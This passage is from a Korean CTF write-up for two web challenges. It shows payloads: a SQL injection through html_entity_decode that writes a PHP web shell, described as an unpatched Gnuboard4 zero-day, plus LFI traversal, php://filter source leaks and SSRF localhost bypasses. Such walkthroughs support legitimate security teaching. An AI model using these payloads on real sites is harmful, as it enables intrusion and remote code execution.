        <span class="nv">$trans_tbl</span> <span class="o">=</span> <span class="nb">get_html_translation_table</span><span class="p">(</span><span class="nx">HTML_ENTITIES</span><span class="p">);</span>
        <span class="nv">$trans_tbl</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$trans_tbl</span><span class="p">);</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">strtr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$trans_tbl</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#(&lt;[^&gt;]+?[\\x00-\\x20"\\'</span><span class="p">])(</span><span class="o">?:</span><span class="nx">on</span><span class="o">|</span><span class="nx">xmlns</span><span class="p">)[</span><span class="o">^&gt;</span><span class="p">]</span><span class="o">*+&gt;</span><span class="c1">#i', '$1&gt;', $data); </span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#([a-z]*)[\\x00-\\x20]*=[\\x00-\\x20]*([`\\'</span><span class="s2">"]*)[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*j[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*a[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*v[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*a[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*s[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*c[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*r[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*i[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*p[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*t[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*:#i', '$1=$2nojavascript...', </span><span class="nv">$data</span><span class="s2">); 
    </span><span class="nv">$data</span><span class="s2"> = preg_replace('#([a-z]*)[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*=([</span><span class="se">\\</span><span class="s2">'"</span><span class="p">]</span><span class="o">*</span><span class="p">)[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">v</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">b</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">s</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">c</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">r</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">i</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">p</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">t</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*:</span><span class="c1">#i', '$1=$2novbscript...', $data); </span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#([a-z]*)[\\x00-\\x20]*=([\\'</span><span class="s2">"]*)[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*-moz-binding[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*:#', '$1=$2nomozbinding...', </span><span class="nv">$data</span><span class="s2">); 
    </span><span class="nv">$data</span><span class="s2"> = preg_replace('#(&lt;[^&gt;]+?)style[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*=[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*[`</span><span class="se">\\</span><span class="s2">'"</span><span class="p">]</span><span class="o">*.*?</span><span class="nb">expression</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="err">\\</span><span class="p">([</span><span class="o">^&gt;</span><span class="p">]</span><span class="o">*+&gt;</span><span class="c1">#i', '$1&gt;', $data); </span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#(&lt;[^&gt;]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\'</span><span class="s2">"]*.*?behaviour[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*</span><span class="se">\\</span><span class="s2">([^&gt;]*+&gt;#i', '$1&gt;', </span><span class="nv">$data</span><span class="s2">); 
    </span><span class="nv">$data</span><span class="s2"> = preg_replace('#(&lt;[^&gt;]+?)style[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*=[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*[`</span><span class="se">\\</span><span class="s2">'"</span><span class="p">]</span><span class="o">*.*?</span><span class="nx">s</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">c</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">r</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">i</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">p</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">t</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*:*</span><span class="p">[</span><span class="o">^&gt;</span><span class="p">]</span><span class="o">*+&gt;</span><span class="c1">#i', '$1&gt;', $data); </span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#&lt;/*\\w+:\\w[^&gt;]*+&gt;#i'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span> 

    <span class="k">do</span> 
    <span class="p">{</span> 
        <span class="nv">$old_data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span> 
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#&lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&gt;]*+&gt;#i'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span> 
    <span class="p">}</span> 
    <span class="k">while</span> <span class="p">(</span><span class="nv">$old_data</span> <span class="o">!==</span> <span class="nv">$data</span><span class="p">);</span> 
     
    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span> 
<span class="p">}</span>

<span class="o">.......</span>

<span class="nv">$xmldata</span> <span class="o">=</span> <span class="nx">xss_filter</span><span class="p">(</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$data</span><span class="p">));</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s1">'update users set xmldata="'</span><span class="o">.</span><span class="nv">$xmldata</span><span class="o">.</span><span class="s1">'" where userid="'</span><span class="o">.</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">])</span><span class="o">.</span><span class="s1">'";'</span><span class="p">;</span>
<span class="nv">$res</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>

</code></pre></div></div>

<p>RCE를 위해 해당 문제에서 사용해야할 것은 “/var/lib/php/sessions/” 경로에 있는 PHP 세션 파일을 사용하는 것 밖에는 없으므로 봐야할 것은 nickname과 userid에 PHP 코드를 넣을 수 있게 SQLI 인젝션을 생각할 수 밖에 없다.</p>

<p>mysqli_real_escape_string 함수를 사용하면 SQLI 취약점을 막을 수 있지만 해당 함수를 사용한뒤에 xss_filter 함수를 사용했기 때문에 SQLI 취약점이 일어날 곳은 여기밖에 없다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$xmldata</span> <span class="o">=</span> <span class="nx">xss_filter</span><span class="p">(</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$data</span><span class="p">));</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s1">'update users set xmldata="'</span><span class="o">.</span><span class="nv">$xmldata</span><span class="o">.</span><span class="s1">'" where userid="'</span><span class="o">.</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">])</span><span class="o">.</span><span class="s1">'";'</span><span class="p">;</span>
<span class="nv">$res</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>

</code></pre></div></div>

<p>그 후 xss_filter를 자세히 살펴보면 아래와 같은 함수를 찾을 수 있다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">"html_entity_decode"</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">html_entity_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> 
    <span class="p">}</span>

</code></pre></div></div>

<p>xss를 방어하기 위해서 html_entity_decode함수를 사용하는데 여기에서 문제가 발생한다.</p>

<p>만약 aaaa”bbbb 를 사용한다면 어떻게 될까?</p>

<p>위 데이터가 html_entity_decode를 거치면 아래와 같이 변환된다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">aaaa</span><span class="s2">"bbbb

</span></code></pre></div></div>

<p>따라서 우리는 quot문자를 사용할 수 있고 update 문에서 SQLI가 발생하게 할 수 있다.</p>

<h3 id="공격-코드">공격 코드</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaaa<span class="ni">&amp;quot;</span>, nickname=<span class="ni">&amp;quot;</span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">x</span><span class="p">]);</span>

</code></pre></div></div>

<h3 id="변환된-공격-코드">변환된 공격 코드</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaaa", nickname="<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">x</span><span class="p">]);</span>

</code></pre></div></div>

<p>사실 이렇게만 보면 아주 간단하고 쉬운 문제이지만, 이 문제를 내게된 배경이 있다.</p>

<p>xss_filter 함수는 그누보드4에서 사용되는 “xss_clean” 함수 이고 제로데이 취약점이였다. 지금은 그누보드5가 배포되고 있어서 문제는 없지만 아직도 그누보드4 배포본 에서는 제로데이 취약점으로 남아 있다.</p>

<p>그누보드4에서는 “common.php”에서 mysqli_real_escape_string 대용으로 addslashes 함수를 이용해 서버로 오는 변수에 대해 전체적으로 SQLI를 방어하고 “extract($_GET);”, “extract($_POST);”를 사용하여 서버에 오는 변수를 그대로 PHP 변수로 사용할 수 있다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">get_magic_quotes_gpc</span><span class="p">()</span> <span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="p">)</span>
	<span class="p">{</span>
		<span class="k">while</span><span class="p">(</span> <span class="k">list</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span> <span class="nv">$v</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="p">)</span>
		<span class="p">{</span>
			<span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$k</span><span class="p">])</span> <span class="p">)</span>
			<span class="p">{</span>
				<span class="k">while</span><span class="p">(</span> <span class="k">list</span><span class="p">(</span><span class="nv">$k2</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$k</span><span class="p">])</span> <span class="p">)</span>
				<span class="p">{</span>
					<span class="nv">$_GET</span><span class="p">[</span><span class="nv">$k</span><span class="p">][</span><span class="nv">$k2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v2</span><span class="p">);</span>
				<span class="p">}</span>
				<span class="o">@</span><span class="nb">reset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$k</span><span class="p">]);</span>
			<span class="p">}</span>
			<span class="k">else</span>
			<span class="p">{</span>
				<span class="nv">$_GET</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="o">@</span><span class="nb">reset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
	<span class="p">}</span>

<span class="nx">same</span> <span class="nv">$_POST</span> <span class="o">...</span>

<span class="nx">same</span> <span class="nv">$_COOKIE</span> <span class="o">...</span>
<span class="p">}</span>

</code></pre></div></div>

<p>그래서 아래와 같이 사용하면 취약점을 발견하기 힘들다. 언뜻 보면 게시판에서 xss를 방어하는 것 같지만 xss_clean 함수 때문에 SQLI 취약점이 일어난다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$query</span> <span class="o">=</span> <span class="s2">"update board set title='</span><span class="nv">$title</span><span class="s2">', body='"</span><span class="o">.</span><span class="nx">xss_clean</span><span class="p">(</span><span class="nv">$body</span><span class="p">)</span><span class="o">.</span><span class="s2">"', '</span><span class="nv">$userid</span><span class="s2">' ...... "</span><span class="p">;</span>

</code></pre></div></div>

<p>babyweb 문제를 내면서 취약점을 쉽게 알아볼 수 있도록 login.php, join.php 등에서는 작은 따옴표를 사용했고, getxmldata.php에서는 큰 따옴표를 사용했으며, SQLI 취약점을 직관적으로 알아볼 수 있도록 mysqli_real_escape_string을 전역적으로 사용하지 않고 xss_filter함수와 같이 보이게 사용하였다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$query</span> <span class="o">=</span> <span class="nx">xss_filter</span><span class="p">(</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nx">데이터</span><span class="p">));</span>
</code></pre></div></div>

<p><br /></p>

<p><br /></p>

<h2 id="catdog">CatDog</h2>

<hr />

<p><img src="/assets/bob/bob923.png" alt="/assets/bob/bob923.png" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lfi + sqli + ssrf
description의 cat은 php, dog은 python flask를 의미한다.

8888포트로 돌고 있는 php는 flag 파일의 read 권한이 없기 때문에 내부에서 돌고 있는 flask를 이용하여 flag 파일을 읽어오는 것이 목표임.
이 flask 서버는 localhost만 접근 가능하다.

웹서버에서 일반적으로 가지는 'www-data' 권한이 아닌 'php' 유저로 돌아간다는 설명이 flask 포트를 얻을 수 있는 힌트임.

lfi를 통해 flask 포트를 알아낸 후 ssrf를 이용하여 flask 서비스에 접근하면 /flag path에서 passcode를 요구한다. 이 passcode는 sqli를 이용하여 얻어낼 수 있다.

/flag?passcode=@@@@와 같이 passcode를 입력하면 플래그를 얻을 수 있다.
</code></pre></div></div>

<h3 id="1-indexphp-소스코드-추출--lfi-취약점">1. index.php 소스코드 추출 + lfi 취약점</h3>

<p><img src="/assets/bob/bob924.png" alt="/assets/bob/bob924.png" /></p>

<p><img src="/assets/bob/bob925.png" alt="/assets/bob/bob925.png" /></p>

<ul>
  <li>메인페이지에서 view-source를 하면 68번째 라인에 주석으로 <code class="highlighter-rouge">index.php/?source</code> 가 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    <span class="k">include_once</span> <span class="s2">"header.php"</span><span class="p">;</span>
    <span class="k">include_once</span> <span class="s2">"config.php"</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'source'</span><span class="p">])){</span>
        <span class="k">echo</span> <span class="s2">"&lt;div style='margin-top: 6rem;'/&gt;"</span><span class="p">;</span>
        <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
        <span class="k">die</span><span class="p">();</span>
    <span class="p">}</span>
    
    <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"page"</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="k">and</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">)){</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/.php/"</span><span class="p">,</span> <span class="nv">$page</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
            <span class="nv">$page</span> <span class="o">.=</span> <span class="s2">".php"</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/(login|register)/"</span><span class="p">,</span> <span class="nv">$page</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">==</span> <span class="kc">null</span><span class="p">){</span>
            <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Please Login!');location.href='/?page=login';&lt;/script&gt;"</span><span class="p">;</span>
            <span class="k">die</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">include</span> <span class="nv">$page</span><span class="p">;</span>
        <span class="k">die</span><span class="p">();</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="c">&lt;!-- index.php/?source --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div&gt;</span>
        <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/images/bg.jpg"</span> <span class="na">style=</span><span class="s">"width: 100%; height: 80vh; object-fit: cover; opacity: 0.5"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"display: flex; justify-content: center;"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"font-size: 4rem;"</span><span class="nt">&gt;</span>
            meow
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<ul>
  <li><code class="highlighter-rouge">index.php/?source</code> 에 접근하면 <code class="highlighter-rouge">index.php</code> 의 소스코드를 얻을 수 있다.</li>
  <li><code class="highlighter-rouge">$page</code> 파라미터를 include하는 것으로 보아 lfi 취약점이 발생할 수 있는 가능성을 볼 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/.php/"</span><span class="p">,</span> <span class="nv">$page</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
            <span class="nv">$page</span> <span class="o">.=</span> <span class="s2">".php"</span><span class="p">;</span>
        <span class="p">}</span>
</code></pre></div></div>

<ul>
  <li><code class="highlighter-rouge">$page</code> 파라미터에 <code class="highlighter-rouge">.php</code> 가 존재하지 않을 경우 마지막에 <code class="highlighter-rouge">.php</code> 를 추가하는 코드가 있지만, 해당 정규표현식은 <code class="highlighter-rouge">.php</code> 가 존재하기만 한다면 우회가 가능하다.</li>
  <li>따라서 <code class="highlighter-rouge">/?page=/.php/../../../../../../etc/issue</code> 와 같은 페이로드를 통해 file leak이 가능하다.</li>
  <li>또한, <code class="highlighter-rouge">/?page=php://filter/convert.base64-encode/resource=articles</code> 와 같이  php wrapper를 이용하여 서비스에 존재하는 php 소스코드를 모두 leak하는 것이 가능하다.</li>
</ul>

<h3 id="2-ssrf-취약점">2. ssrf 취약점</h3>

<p><img src="/assets/bob/bob926.png" alt="/assets/bob/bob926.png" /></p>

<ul>
  <li>다음으로 articles를 보면 글 작성 시 이미지가 자동으로 첨부되는 것을 확인할 수 있는데, 이 이미지를 mypage에서 변경할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob927.png" alt="/assets/bob/bob927.png" /></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- ... --&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"type"</span><span class="p">])){</span>
        <span class="nb">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
        <span class="nv">$url</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"url"</span><span class="p">]);</span>

        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^(http\:\/\/|https\:\/\/)/"</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">||</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/(127\.0\.0\.1|localhost)/"</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span><span class="p">){</span>
            <span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('Don\'t hack!');location.href='/?page=mypage';&lt;/script&gt;"</span><span class="p">);</span>
            <span class="k">die</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$url</span> <span class="o">==</span> <span class="s2">""</span><span class="p">){</span>
            <span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('Enter the image URL!');location.href='/?page=mypage';&lt;/script&gt;"</span><span class="p">);</span>
            <span class="k">die</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"p"</span><span class="p">){</span>
            <span class="nv">$data</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">));</span>
            <span class="nv">$src</span> <span class="o">=</span> <span class="s2">"data: png;base64,${data}"</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">"&lt;img src='${src}' style='height: 40vh; width: 100%; object-fit: cover;'/&gt;"</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"o"</span><span class="p">){</span>
            <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$sql</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"update user set img = ? where username = ?"</span><span class="p">);</span>
            <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s1">'ss'</span><span class="p">,</span> <span class="nv">$url</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]);</span>
            <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
        
            <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
            <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Complete.');location.href='/?page=articles'&lt;/script&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="c">&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<ul>
  <li>mypage의 코드를 확인해보면 preview를 눌렀을 때 <code class="highlighter-rouge">file_get_contents</code> 를 이용하여 <code class="highlighter-rouge">url</code> 의 값을 가져온 후 base64로 인코딩하여 이미지를 보여준다.</li>
  <li>이 때 <code class="highlighter-rouge">file_get_contents</code> 를 이용한 file leak을 방지하기 위해 <code class="highlighter-rouge">http/https scheme</code> 를 강제하였으며, <code class="highlighter-rouge">localhost</code> 와 <code class="highlighter-rouge">127.0.0.1</code> 의 값을 막아두었다.</li>
  <li>여기서 도메인을 <code class="highlighter-rouge">localhost</code> 와 <code class="highlighter-rouge">127.0.0.1</code> 대신 <code class="highlighter-rouge">http://0</code> 이나 10진수 표현 <code class="highlighter-rouge">http://213070643</code> 또는 16진수 표현 <code class="highlighter-rouge">http://0x7F000001</code> 등을 사용하여 우회하면 ssrf 취약점이 발생한다.</li>
</ul>

<h3 id="3-힌트">3. 힌트</h3>

<p><img src="/assets/bob/bob928.png" alt="/assets/bob/bob928.png" /></p>

<ul>
  <li>다시 문제 description을 살펴보면 주머니에 <code class="highlighter-rouge">개</code> 를 숨겨두었으며, 플래그를 가지고 있다고 한다. 현재로선 개가 어떤 <code class="highlighter-rouge">개</code> 가 어떤 것을 의미하는지 알 수 없다.</li>
  <li>다음으로, 하단의 박스를 확인해보면 웹서버가 <code class="highlighter-rouge">www-data</code> 가 아닌 <code class="highlighter-rouge">php</code> 유저로 돌고 있다는 것을 확인할 수 있다.</li>
  <li>웹서버의 유저를 변경하여 사용하는 경우는 특수한 경우이기 때문에, 의심해볼 여지가 있다.</li>
</ul>

<p><img src="/assets/bob/bob929.png" alt="/assets/bob/bob929.png" /></p>

<ul>
  <li>php 계정에 대한 힌트를 얻었으니, lfi 취약점을 이용해 <code class="highlighter-rouge">/etc/passwd</code> 파일을 확인해보자.</li>
  <li>해당 파일에는 php 계정과 python 계정이 존재하며, <code class="highlighter-rouge">/home/php</code> 와 <code class="highlighter-rouge">/home/python</code> 가 홈 디렉토리로 지정되어 있다. 또한, 계정 접근 시 <code class="highlighter-rouge">/bin/bash</code> 를 사용하는 것으로 보아 쉘을 사용한다는 것을 유추할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob930.png" alt="/assets/bob/bob930.png" /></p>

<ul>
  <li><code class="highlighter-rouge">php</code> 계정 홈 디렉토리에 존재하는 <code class="highlighter-rouge">.bash_history</code> 를 확인해보면 <code class="highlighter-rouge">localhost</code> 의 2026 포트로 <code class="highlighter-rouge">curl</code> 요청을 날리는 것을 확인할 수 있다. 이를 통해 문제 description의 <code class="highlighter-rouge">개</code> 가 웹 서비스라는 것을 알 수 있다.</li>
  <li>해당 포트에서 돌고 있는 웹 서비스는 <code class="highlighter-rouge">localhost</code> 에서만 접근이 가능하도록 설정하였기 때문에, 이전에 발견했던 <code class="highlighter-rouge">ssrf</code> 취약점을 통해 요청을 해야만 한다.</li>
</ul>

<h3 id="4-숨겨진-웹-서비스dog-요청">4. 숨겨진 웹 서비스(dog) 요청</h3>

<p><img src="/assets/bob/bob931.png" alt="/assets/bob/bob931.png" /></p>

<ul>
